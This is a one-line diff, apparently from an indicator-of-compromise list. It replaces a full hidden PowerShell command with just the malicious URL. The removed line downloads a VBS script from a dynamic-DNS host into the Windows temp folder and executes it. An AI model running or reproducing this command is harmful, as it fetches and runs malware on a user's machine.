@@ -1,1 +1,1 @@
-powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://sostenermio24.duckdns.org/reporting.vbs -OutFile C:\Windows\Temp\z.vbs; Start-Sleep -Seconds 5; Start-Process C:\Windows\Temp\z.vbs"
+http://sostenermio24.duckdns.org/reporting.vbs
